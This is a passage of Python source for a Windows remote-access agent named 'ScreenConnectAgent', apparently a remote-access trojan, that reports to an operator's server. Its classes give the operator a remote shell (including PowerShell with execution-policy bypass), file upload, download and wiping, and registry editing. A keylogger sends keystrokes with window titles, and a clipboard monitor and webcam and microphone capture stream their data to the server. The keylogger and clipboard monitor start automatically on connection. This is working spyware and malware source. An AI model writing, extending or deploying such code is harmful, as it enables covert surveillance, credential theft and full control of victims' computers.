            "ram_total_gb":     round(vm.total     / (1024**3), 2),
            "ram_used_gb":      round(vm.used      / (1024**3), 2),
            "ram_free_gb":      round(vm.available / (1024**3), 2),
            "ram_percent":      vm.percent,
            "swap_total_gb":    round(swap.total / (1024**3), 2),
            "swap_used_gb":     round(swap.used  / (1024**3), 2),
            "swap_percent":     swap.percent,
            "disk_total_gb":    round(disk.total / (1024**3), 2),
            "disk_used_gb":     round(disk.used  / (1024**3), 2),
            "disk_free_gb":     round(disk.free  / (1024**3), 2),
            "disk_percent":     disk.percent,
            "net_sent_mb":      round(net.bytes_sent / (1024**2), 2),
            "net_recv_mb":      round(net.bytes_recv / (1024**2), 2),
            "net_packets_sent": net.packets_sent,
            "net_packets_recv": net.packets_recv,
            "net_mbps_up":      round(_net_monitor.get_mbps(), 2),
            "battery_pct":      bat.percent       if bat else None,
            "battery_plug":     bat.power_plugged  if bat else None,
            "boot_time":        datetime.fromtimestamp(psutil.boot_time()).isoformat(),
            "uptime_hrs":       round((time.time() - psutil.boot_time()) / 3600, 2),
        }

        if WMI_OK:
            try:
                c = wmi.WMI(namespace="root\\OpenHardwareMonitor")
                stats["temperatures"] = {s.Name: round(s.Value, 1) for s in c.Sensor() if s.SensorType == "Temperature"}
            except Exception:
                stats["temperatures"] = {}
            try:
                stats["gpus"] = [{"name": g.Name, "driver": g.DriverVersion, "memory_mb": round(int(g.AdapterRAM or 0) / (1024**2), 0)} for g in wmi.WMI().Win32_VideoController()]
            except Exception:
                stats["gpus"] = []
        else:
            stats["temperatures"] = {}
            stats["gpus"] = []

        return stats

    def get_disk_list(self) -> list:
        result = []
        for p in psutil.disk_partitions(all=False):
            try:
                u = psutil.disk_usage(p.mountpoint)
                io = None
                try:
                    ios = psutil.disk_io_counters(perdisk=True)
                    dev_name = p.device.replace("\\", "").replace(":", "").lower()
                    for k, v in ios.items():
                        if dev_name in k.lower():
                            io = {"read_mb": round(v.read_bytes / (1024**2), 1),
                                  "write_mb": round(v.write_bytes / (1024**2), 1)}
                            break
                except Exception:
                    pass
                result.append({
                    "device":     p.device,
                    "mountpoint": p.mountpoint,
                    "fstype":     p.fstype,
                    "total_gb":   round(u.total / (1024**3), 2),
                    "used_gb":    round(u.used  / (1024**3), 2),
                    "free_gb":    round(u.free  / (1024**3), 2),
                    "percent":    u.percent,
                    "io":         io,
                })
            except Exception:
                pass
        return result

    def get_network_interfaces(self) -> dict:
        addrs = {}
        stats = psutil.net_if_stats()
        for iface, addr_list in psutil.net_if_addrs().items():
            st = stats.get(iface)
            addrs[iface] = {
                "addresses": [{"family": str(a.family), "address": a.address, "netmask": a.netmask} for a in addr_list],
                "is_up":     st.isup if st else False,
                "speed_mbps": st.speed if st else 0,
            }
        return addrs

    def _loop(self, interval):
        while self.monitoring:
            try:
                self.sio.emit("system_stats_report", self.get_snapshot())
            except Exception as e:
                log.error(f"SysMonitor error: {e}")
            time.sleep(interval)


# ════════════════════════════════════════════════════════════════════════════
#  PROCESS MANAGER
# ════════════════════════════════════════════════════════════════════════════
class ProcessManager:
    @staticmethod
    def list_processes() -> list:
        procs = []
        for p in psutil.process_iter(["pid", "name", "status", "cpu_percent",
                                       "memory_percent", "username", "create_time",
                                       "cmdline", "exe"]):
            try:
                info = p.info
                info["memory_mb"]   = round(p.memory_info().rss / (1024**2), 2)
                info["create_time"] = datetime.fromtimestamp(info["create_time"]).isoformat() if info.get("create_time") else None
                info["cmdline"]     = " ".join(info.get("cmdline") or [])[:256]
                procs.append(info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        return sorted(procs, key=lambda x: x.get("cpu_percent", 0), reverse=True)

    @staticmethod
    def kill_process(pid: int) -> dict:
        try:
            p = psutil.Process(pid)
            name = p.name()
            p.terminate()
            try:
                p.wait(timeout=3)
            except psutil.TimeoutExpired:
                p.kill()
            return {"success": True, "message": f"Terminated PID {pid} ({name})"}
        except psutil.NoSuchProcess:
            return {"success": False, "message": f"PID {pid} not found."}
        except psutil.AccessDenied:
            return {"success": False, "message": f"Access denied for PID {pid}."}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def start_process(command: str) -> dict:
        try:
            proc = subprocess.Popen(command, shell=True,
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL,
                                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
            return {"success": True, "pid": proc.pid, "message": f"Started: {command}"}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def suspend_process(pid: int) -> dict:
        try:
            p = psutil.Process(pid)
            p.suspend()
            return {"success": True, "message": f"Suspended PID {pid}"}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def resume_process(pid: int) -> dict:
        try:
            p = psutil.Process(pid)
            p.resume()
            return {"success": True, "message": f"Resumed PID {pid}"}
        except Exception as e:
            return {"success": False, "message": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  FILE BROWSER
# ════════════════════════════════════════════════════════════════════════════
class FileBrowser:
    MAX_UPLOAD_MB  = 100
    MAX_READ_KB    = 1024

    @staticmethod
    def list_directory(path: str) -> dict:
        try:
            p = Path(path)
            if not p.exists():
                return {"error": f"Not found: {path}"}
            if not p.is_dir():
                return {"error": f"Not a directory: {path}"}
            entries = []
            for item in sorted(p.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
                try:
                    stat = item.stat()
                    entries.append({
                        "name":     item.name,
                        "path":     str(item),
                        "type":     "dir" if item.is_dir() else "file",
                        "size_kb":  round(stat.st_size / 1024, 2) if item.is_file() else None,
                        "size_b":   stat.st_size if item.is_file() else None,
                        "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                        "created":  datetime.fromtimestamp(stat.st_ctime).isoformat(),
                        "hidden":   item.name.startswith("."),
                        "ext":      item.suffix.lower() if item.is_file() else "",
                    })
                except (PermissionError, OSError):
                    entries.append({
                        "name": item.name,
                        "path": str(item),
                        "type": "dir" if item.is_dir() else "file",
                        "error": "access denied",
                    })
            parent = str(p.parent) if p.parent != p else None
            return {"path": str(p), "parent": parent, "entries": entries, "count": len(entries)}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def read_file(path: str, max_kb: int = 1024) -> dict:
        try:
            p = Path(path)
            if not p.is_file():
                return {"error": "Not a file."}
            size_kb = p.stat().st_size / 1024
            if size_kb > max_kb:
                return {"error": f"File too large ({size_kb:.1f} KB > {max_kb} KB)."}
            try:
                content = p.read_text(encoding="utf-8")
            except UnicodeDecodeError:
                content = p.read_text(encoding="latin-1", errors="replace")
            return {"path": str(p), "content": content,
                    "size_kb": round(size_kb, 2), "lines": content.count("\n")}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def write_file(path: str, content: str) -> dict:
        try:
            p = Path(path)
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(content, encoding="utf-8")
            return {"success": True, "path": str(p), "bytes": p.stat().st_size}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def download_file(path: str) -> dict:
        try:
            p = Path(path)
            if not p.is_file():
                return {"error": "Not a file."}
            size_mb = p.stat().st_size / (1024**2)
            if size_mb > FileBrowser.MAX_UPLOAD_MB:
                return {"error": f"File too large ({size_mb:.1f} MB > {FileBrowser.MAX_UPLOAD_MB} MB)."}
            return {
                "path":     str(p),
                "filename": p.name,
                "size_mb":  round(size_mb, 3),
                "data":     base64.b64encode(p.read_bytes()).decode(),
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def upload_file(path: str, data_b64: str) -> dict:
        try:
            p = Path(path)
            p.parent.mkdir(parents=True, exist_ok=True)
            raw = base64.b64decode(data_b64)
            p.write_bytes(raw)
            return {"success": True, "path": str(p), "bytes": len(raw)}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def delete_file(path: str) -> dict:
        try:
            p = Path(path)
            if p.is_file():
                p.unlink()
                return {"success": True, "message": f"Deleted: {path}"}
            elif p.is_dir():
                _shutil.rmtree(str(p))
                return {"success": True, "message": f"Deleted dir: {path}"}
            return {"success": False, "message": "Path not found."}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def copy_file(src: str, dst: str) -> dict:
        try:
            _shutil.copy2(src, dst)
            return {"success": True, "message": f"Copied {src} → {dst}"}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def move_file(src: str, dst: str) -> dict:
        try:
            _shutil.move(src, dst)
            return {"success": True, "message": f"Moved {src} → {dst}"}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def create_folder(path: str) -> dict:
        try:
            Path(path).mkdir(parents=True, exist_ok=True)
            return {"success": True, "path": path}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def rename(old: str, new: str) -> dict:
        try:
            Path(old).rename(new)
            return {"success": True, "old": old, "new": new}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def search(root: str, pattern: str, max_results: int = 200) -> dict:
        try:
            results = []
            for p in Path(root).rglob(pattern):
                results.append(str(p))
                if len(results) >= max_results:
                    break
            return {"results": results, "count": len(results), "pattern": pattern, "root": root}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def list_drives() -> list:
        drives = []
        for p in psutil.disk_partitions(all=False):
            try:
                u = psutil.disk_usage(p.mountpoint)
                drives.append({
                    "drive":    p.mountpoint,
                    "label":    p.device,
                    "total_gb": round(u.total / (1024**3), 2),
                    "used_gb":  round(u.used  / (1024**3), 2),
                    "free_gb":  round(u.free  / (1024**3), 2),
                    "percent":  u.percent,
                    "fstype":   p.fstype,
                })
            except Exception:
                pass
        return drives


# ════════════════════════════════════════════════════════════════════════════
#  REMOTE SHELL (with PowerShell + CMD + Python REPL)
# ════════════════════════════════════════════════════════════════════════════
class RemoteShell:
    TIMEOUT = 60

    @staticmethod
    def execute(command: str, shell_type: str = "cmd") -> dict:
        t0 = time.time()
        try:
            env = os.environ.copy()
            if shell_type == "powershell":
                cmd = ["powershell", "-NoProfile", "-NonInteractive",
                       "-ExecutionPolicy", "Bypass", "-Command", command]
                shell_flag = False
            elif shell_type == "python":
                cmd = [sys.executable, "-c", command]
                shell_flag = False
            else:
                cmd = command
                shell_flag = True
            result = subprocess.run(
                cmd, shell=shell_flag,
                capture_output=True, text=True,
                timeout=RemoteShell.TIMEOUT, env=env,
                cwd=os.path.expanduser("~"),
            )
            return {
                "success":    True,
                "command":    command,
                "shell_type": shell_type,
                "stdout":     result.stdout[-16384:],
                "stderr":     result.stderr[-4096:],
                "returncode": result.returncode,
                "elapsed_s":  round(time.time() - t0, 3),
                "ts":         datetime.utcnow().isoformat(),
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "command": command, "error": f"Timed out ({RemoteShell.TIMEOUT}s)."}
        except Exception as e:
            return {"success": False, "command": command, "error": str(e)}

    @staticmethod
    def get_env() -> dict:
        return {"env": dict(os.environ), "cwd": os.getcwd()}

    @staticmethod
    def set_cwd(path: str) -> dict:
        try:
            os.chdir(path)
            return {"success": True, "cwd": os.getcwd()}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  REGISTRY MANAGER
# ════════════════════════════════════════════════════════════════════════════
class RegistryManager:
    HIVES = {
        "HKLM": winreg.HKEY_LOCAL_MACHINE,
        "HKCU": winreg.HKEY_CURRENT_USER,
        "HKCR": winreg.HKEY_CLASSES_ROOT,
        "HKU":  winreg.HKEY_USERS,
        "HKCC": winreg.HKEY_CURRENT_CONFIG,
    }

    @classmethod
    def _parse_path(cls, path: str):
        parts = path.replace("/", "\\").split("\\", 1)
        hive_str = parts[0].upper()
        subkey = parts[1] if len(parts) > 1 else ""
        hive = cls.HIVES.get(hive_str)
        if not hive:
            raise ValueError(f"Unknown hive: {hive_str}")
        return hive, subkey

    @classmethod
    def read_key(cls, path: str, value_name: str = "") -> dict:
        try:
            hive, subkey = cls._parse_path(path)
            with winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as k:
                data, reg_type = winreg.QueryValueEx(k, value_name)
                return {"success": True, "path": path, "name": value_name, "data": str(data), "type": reg_type}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @classmethod
    def list_key(cls, path: str) -> dict:
        try:
            hive, subkey = cls._parse_path(path)
            with winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as k:
                values = []
                i = 0
                while True:
                    try:
                        name, data, reg_type = winreg.EnumValue(k, i)
                        values.append({"name": name, "data": str(data)[:512], "type": reg_type})
                        i += 1
                    except OSError:
                        break
                subkeys = []
                i = 0
                while True:
                    try:
                        subkeys.append(winreg.EnumKey(k, i))
                        i += 1
                    except OSError:
                        break
                return {"success": True, "path": path, "values": values, "subkeys": subkeys}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @classmethod
    def write_key(cls, path: str, value_name: str, data: str, reg_type: int = winreg.REG_SZ) -> dict:
        try:
            hive, subkey = cls._parse_path(path)
            with winreg.CreateKeyEx(hive, subkey, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY) as k:
                winreg.SetValueEx(k, value_name, 0, reg_type, data)
            return {"success": True, "path": path, "name": value_name}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @classmethod
    def delete_value(cls, path: str, value_name: str) -> dict:
        try:
            hive, subkey = cls._parse_path(path)
            with winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY) as k:
                winreg.DeleteValue(k, value_name)
            return {"success": True, "path": path, "name": value_name}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  SERVICE MANAGER
# ════════════════════════════════════════════════════════════════════════════
class ServiceManager:
    @staticmethod
    def list_services() -> list:
        try:
            result = subprocess.run(
                ["sc", "query", "type=", "all", "state=", "all"],
                capture_output=True, text=True, timeout=20
            )
            services = []
            if WMI_OK:
                for svc in wmi.WMI().Win32_Service():
                    services.append({
                        "name":        svc.Name,
                        "display":     svc.DisplayName,
                        "state":       svc.State,
                        "start_type":  svc.StartMode,
                        "path":        svc.PathName or "",
                    })
            return services
        except Exception as e:
            return [{"error": str(e)}]

    @staticmethod
    def control_service(name: str, action: str) -> dict:
        """action: start | stop | restart | pause | resume"""
        try:
            cmds = {
                "start":   ["net", "start", name],
                "stop":    ["net", "stop",  name],
                "restart": None,
                "pause":   ["sc", "pause",  name],
                "resume":  ["sc", "continue", name],
            }
            if action == "restart":
                subprocess.run(["net", "stop",  name], capture_output=True, timeout=20)
                time.sleep(2)
                r = subprocess.run(["net", "start", name], capture_output=True, text=True, timeout=20)
            elif action in cmds:
                r = subprocess.run(cmds[action], capture_output=True, text=True, timeout=20)
            else:
                return {"success": False, "error": f"Unknown action: {action}"}
            return {"success": r.returncode == 0, "name": name, "action": action,
                    "stdout": r.stdout, "stderr": r.stderr}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  WINDOW MANAGER
# ════════════════════════════════════════════════════════════════════════════
class WindowManager:
    @staticmethod
    def list_windows() -> list:
        if not WIN32_OK:
            return [{"error": "pywin32 not available"}]
        windows = []
        def enum_cb(hwnd, _):
            if win32gui.IsWindowVisible(hwnd):
                title = win32gui.GetWindowText(hwnd)
                if title:
                    rect = win32gui.GetWindowRect(hwnd)
                    try:
                        _, pid = win32process.GetWindowThreadProcessId(hwnd)
                        try:
                            proc = psutil.Process(pid)
                            pname = proc.name()
                        except Exception:
                            pname = ""
                    except Exception:
                        pid, pname = 0, ""
                    windows.append({
                        "hwnd":    hwnd,
                        "title":   title,
                        "rect":    rect,
                        "pid":     pid,
                        "process": pname,
                    })
        win32gui.EnumWindows(enum_cb, None)
        return windows

    @staticmethod
    def focus_window(hwnd: int) -> dict:
        if not WIN32_OK:
            return {"success": False, "error": "pywin32 not available"}
        try:
            win32gui.SetForegroundWindow(hwnd)
            return {"success": True, "hwnd": hwnd}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def close_window(hwnd: int) -> dict:
        if not WIN32_OK:
            return {"success": False, "error": "pywin32 not available"}
        try:
            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
            return {"success": True, "hwnd": hwnd}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def minimize_window(hwnd: int) -> dict:
        if not WIN32_OK:
            return {"success": False, "error": "pywin32 not available"}
        try:
            win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
            return {"success": True, "hwnd": hwnd}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def maximize_window(hwnd: int) -> dict:
        if not WIN32_OK:
            return {"success": False, "error": "pywin32 not available"}
        try:
            win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
            return {"success": True, "hwnd": hwnd}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  INSTALLED APPS
# ════════════════════════════════════════════════════════════════════════════
class InstalledApps:
    @staticmethod
    def list_apps() -> list:
        apps = []
        reg_paths = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        ]
        seen = set()
        for hive, path in reg_paths:
            try:
                with winreg.OpenKey(hive, path, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as key:
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            sub_name = winreg.EnumKey(key, i)
                            with winreg.OpenKey(key, sub_name) as sub:
                                def rv(n, d=""):
                                    try: return winreg.QueryValueEx(sub, n)[0]
                                    except: return d
                                name = rv("DisplayName")
                                if name and name not in seen:
                                    seen.add(name)
                                    apps.append({
                                        "name":      name,
                                        "version":   rv("DisplayVersion"),
                                        "publisher": rv("Publisher"),
                                        "install_date": rv("InstallDate"),
                                        "size_mb":   round(int(rv("EstimatedSize", 0)) / 1024, 1),
                                        "location":  rv("InstallLocation"),
                                    })
                        except Exception:
                            pass
            except Exception:
                pass
        return sorted(apps, key=lambda x: x.get("name", "").lower())


# ════════════════════════════════════════════════════════════════════════════
#  AUDIO CAPTURE
# ════════════════════════════════════════════════════════════════════════════
class AudioCapture:
    def __init__(self, sio_client):
        self.sio     = sio_client
        self.running = False
        self._thread: Optional[threading.Thread] = None

    def capture_chunk(self, seconds: float = 3.0, sample_rate: int = 16000) -> dict:
        if not AUDIO_OK:
            return {"error": "sounddevice not available"}
        try:
            recording = sd.rec(int(seconds * sample_rate), samplerate=sample_rate,
                               channels=1, dtype="int16")
            sd.wait()
            buf = BytesIO()
            wavfile.write(buf, sample_rate, recording)
            return {
                "success":     True,
                "duration_s":  seconds,
                "sample_rate": sample_rate,
                "data":        base64.b64encode(buf.getvalue()).decode(),
                "ts":          datetime.utcnow().isoformat(),
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def list_devices() -> list:
        if not AUDIO_OK:
            return []
        try:
            devs = sd.query_devices()
            return [{"index": i, "name": d["name"], "channels_in": d["max_input_channels"],
                     "channels_out": d["max_output_channels"]} for i, d in enumerate(devs)]
        except Exception:
            return []


# ════════════════════════════════════════════════════════════════════════════
#  ALERT ENGINE
# ════════════════════════════════════════════════════════════════════════════
class AlertEngine:
    def __init__(self, sio_client):
        self.sio         = sio_client
        self._last_alerts: Dict[str, float] = {}
        self.running     = False
        self._thread: Optional[threading.Thread] = None

    def start(self):
        if self.running or not CONFIG["ENABLE_ALERTS"]:
            return
        self.running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self.running = False

    def _can_alert(self, key: str) -> bool:
        now = time.time()
        last = self._last_alerts.get(key, 0)
        if now - last >= CONFIG["ALERT_COOLDOWN_S"]:
            self._last_alerts[key] = now
            return True
        return False

    def _loop(self):
        while self.running:
            try:
                cpu = psutil.cpu_percent(interval=2)
                ram = psutil.virtual_memory().percent
                disk = psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\").percent

                if cpu >= CONFIG["ALERT_CPU_THRESHOLD"] and self._can_alert("cpu"):
                    self.sio.emit("agent_alert", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "type": "cpu", "value": cpu,
                        "threshold": CONFIG["ALERT_CPU_THRESHOLD"],
                        "message": f"CPU usage critical: {cpu:.1f}%",
                        "ts": datetime.utcnow().isoformat(),
                    })
                if ram >= CONFIG["ALERT_RAM_THRESHOLD"] and self._can_alert("ram"):
                    self.sio.emit("agent_alert", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "type": "ram", "value": ram,
                        "threshold": CONFIG["ALERT_RAM_THRESHOLD"],
                        "message": f"RAM usage critical: {ram:.1f}%",
                        "ts": datetime.utcnow().isoformat(),
                    })
                if disk >= CONFIG["ALERT_DISK_THRESHOLD"] and self._can_alert("disk"):
                    self.sio.emit("agent_alert", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "type": "disk", "value": disk,
                        "threshold": CONFIG["ALERT_DISK_THRESHOLD"],
                        "message": f"Disk usage critical: {disk:.1f}%",
                        "ts": datetime.utcnow().isoformat(),
                    })
            except Exception as e:
                log.error(f"AlertEngine error: {e}")
            time.sleep(30)


# ════════════════════════════════════════════════════════════════════════════
#  SECURE ERASER
# ════════════════════════════════════════════════════════════════════════════
class SecureEraser:
    @staticmethod
    def wipe_file(path: str, passes: int = 3) -> dict:
        try:
            p = Path(path)
            if not p.is_file():
                return {"success": False, "error": "Not a file"}
            size = p.stat().st_size
            with open(p, "r+b") as f:
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(size))
                    f.flush()
                    os.fsync(f.fileno())
            p.unlink()
            return {"success": True, "path": str(p), "passes": passes}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  KEYLOGGER
# ════════════════════════════════════════════════════════════════════════════
class KeyLogger:
    def __init__(self, sio_client):
        self.sio        = sio_client
        self._buf: list = []
        self._lock      = threading.Lock()
        self._listener  = None
        self._flush_t: Optional[threading.Thread] = None
        self.running    = False

    def start(self):
        if not PYNPUT_OK or self.running:
            return
        self.running     = True
        self._listener   = pynput.keyboard.Listener(on_press=self._on_key)
        self._listener.start()
        self._flush_t    = threading.Thread(target=self._flush_loop, daemon=True)
        self._flush_t.start()
        log.info("Keylogger started.")

    def stop(self):
        self.running = False
        if self._listener:
            try:
                self._listener.stop()
            except Exception:
                pass

    def _on_key(self, key):
        try:
            with self._lock:
                ch = key.char if hasattr(key, "char") and key.char else f"[{str(key).replace('Key.', '')}]"
                self._buf.append(ch)
        except Exception:
            pass

    def _active_window(self) -> str:
        try:
            hwnd   = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf    = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
        except Exception:
            return ""

    def _flush_loop(self):
        while self.running:
            time.sleep(CONFIG["KEYLOG_FLUSH_INTERVAL"])
            self._flush()

    def _flush(self):
        with self._lock:
            if not self._buf:
                return
            text = "".join(self._buf)
            self._buf.clear()
        try:
            self.sio.emit("keylog_data", {
                "device_id": CONFIG["DEVICE_TOKEN"],
                "text":      text,
                "window":    self._active_window(),
                "ts":        datetime.utcnow().isoformat(),
            })
        except Exception:
            pass


# ════════════════════════════════════════════════════════════════════════════
#  CLIPBOARD MONITOR
# ════════════════════════════════════════════════════════════════════════════
class ClipboardMonitor:
    def __init__(self, sio_client):
        self.sio     = sio_client
        self._last   = ""
        self._t: Optional[threading.Thread] = None
        self.running = False

    def start(self):
        if not CLIPBOARD_OK or self.running:
            return
        self.running = True
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()

    def stop(self):
        self.running = False

    def _loop(self):
        poll = CONFIG["CLIPBOARD_POLL_MS"] / 1000.0
        while self.running:
            try:
                cur = pyperclip.paste()
                if cur and cur != self._last:
                    self._last = cur
                    self.sio.emit("clipboard_data", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "content":   cur[:8192],
                        "length":    len(cur),
                        "ts":        datetime.utcnow().isoformat(),
                    })
            except Exception:
                pass
            time.sleep(poll)


# ════════════════════════════════════════════════════════════════════════════
#  WEBCAM CAPTURE
# ════════════════════════════════════════════════════════════════════════════
class WebcamCapture:
    def __init__(self, sio_client):
        self.sio = sio_client

    def capture(self, camera_idx: int = 0, quality: int = 80) -> dict:
        if not CV2_OK:
            return {"error": "OpenCV not available."}
        cap = None
        try:
            cap = cv2.VideoCapture(camera_idx)
            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
            if not cap.isOpened():
                return {"error": f"Camera {camera_idx} could not be opened."}
            # Read multiple frames to flush buffer
            for _ in range(3):
                cap.read()
            ret, frame = cap.read()
            if not ret:
                return {"error": "Failed to read frame from camera."}
            success, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, quality])
            if not success:
                return {"error": "Encoding failed."}
            return {
                "success":    True,
                "camera_idx": camera_idx,
                "frame":      base64.b64encode(buf.tobytes()).decode(),
                "w":          frame.shape[1],
                "h":          frame.shape[0],
                "ts":         datetime.utcnow().isoformat(),
            }
        except Exception as e:
            return {"error": str(e)}
        finally:
            if cap:
                cap.release()

    @staticmethod
    def list_cameras() -> list:
        if not CV2_OK:
            return []
        cameras = []
        for i in range(8):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                cameras.append({"index": i, "name": f"Camera {i}", "w": w, "h": h})
                cap.release()
        return cameras


# ════════════════════════════════════════════════════════════════════════════
#  HEARTBEAT
# ════════════════════════════════════════════════════════════════════════════
class Heartbeat:
    def __init__(self, sio_client):
        self.sio     = sio_client
        self._t: Optional[threading.Thread] = None
        self.running = False

    def start(self):
        if self.running:
            return
        self.running = True
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()

    def stop(self):
        self.running = False

    def _loop(self):
        while self.running:
            try:
                bat = psutil.sensors_battery()
                self.sio.emit("heartbeat", {
                    "device_id":     CONFIG["DEVICE_TOKEN"],
                    "cpu":           psutil.cpu_percent(interval=0),
                    "ram":           psutil.virtual_memory().percent,
                    "disk":          psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\").percent,
                    "net_mbps":      round(_net_monitor.get_mbps(), 1),
                    "battery_pct":   bat.percent if bat else None,
                    "battery_plug":  bat.power_plugged if bat else None,
                    "ts":            datetime.utcnow().isoformat(),
                })
            except Exception as e:
                log.warning(f"Heartbeat error: {e}")
            time.sleep(CONFIG["HEARTBEAT_INTERVAL"])


# ════════════════════════════════════════════════════════════════════════════
#  MAIN AGENT CLASS
# ════════════════════════════════════════════════════════════════════════════
class ScreenConnectAgent:
    def __init__(self):
        self._reconnect_delay = CONFIG["RECONNECT_BASE"]
        self._stop_flag       = threading.Event()

    def _make_client(self):
        """Create a brand-new socketio.Client on every reconnect."""
        sio         = socketio.Client(logger=False, engineio_logger=False, reconnection=False)
        cursor      = CursorTracker(sio)
        streamer    = ScreenStreamer(sio, cursor)
        sys_monitor = SystemMonitor(sio)
        keylogger   = KeyLogger(sio)
        clipboard   = ClipboardMonitor(sio)
        webcam      = WebcamCapture(sio)
        shell       = RemoteShell()
        proc_mgr    = ProcessManager()
        files       = FileBrowser()
        heartbeat   = Heartbeat(sio)
        alerts      = AlertEngine(sio)
        registry    = RegistryManager()
        services    = ServiceManager()
        winmgr      = WindowManager()
        audio       = AudioCapture(sio)
        apps        = InstalledApps()
        eraser      = SecureEraser()

        self._register_events(
            sio, cursor, streamer, sys_monitor, keylogger, clipboard,
            webcam, shell, proc_mgr, files, heartbeat, alerts,
            registry, services, winmgr, audio, apps, eraser,
        )
        return sio, streamer, sys_monitor, heartbeat, cursor, keylogger, clipboard, alerts

    def _register_events(
        self, sio, cursor, streamer, sys_monitor, keylogger, clipboard,
        webcam, shell, proc_mgr, files, heartbeat, alerts,
        registry, services, winmgr, audio, apps, eraser,
    ):
        @sio.event
        def connect():
            self._reconnect_delay = CONFIG["RECONNECT_BASE"]
            log.info(f"Connected to {CONFIG['SERVER_URL']}")

            fp = get_device_fingerprint()
            fp["device_id"] = CONFIG["DEVICE_TOKEN"]
            fp["token"]     = CONFIG["DEVICE_TOKEN"]
            sio.emit("agent_connect", fp)

            # HTTP belt-and-suspenders checkin
            try:
                requests.post(
                    CONFIG["SERVER_URL"].rstrip("/") + "/agent/checkin",
                    json={"device_id": CONFIG["DEVICE_TOKEN"], **fp},
                    timeout=10
                )
            except Exception:
                pass

            heartbeat.start()
            cursor.start()
            alerts.start()
            if CONFIG["ENABLE_KEYLOGGER"]:  keylogger.start()
            if CONFIG["ENABLE_CLIPBOARD"]:  clipboard.start()

        @sio.event
        def disconnect():
            log.warning("Disconnected from server.")
            streamer.stop()
            sys_monitor.stop()
            heartbeat.stop()
            alerts.stop()

        @sio.on("frame_ack")
        def on_frame_ack(data):
            streamer.on_ack()

        @sio.on("request_action")
        def on_action(data):
            tab = data.get("tab", "")
            log.info(f"Action: {tab}")

            # ── Monitor / Stream ───────────────────────────────────────────
            if tab == "monitor":
                action = data.get("action", "start")
                if action == "start":
                    streamer.start(
                        monitor=data.get("monitor",  CONFIG["STREAM_MONITOR"]),
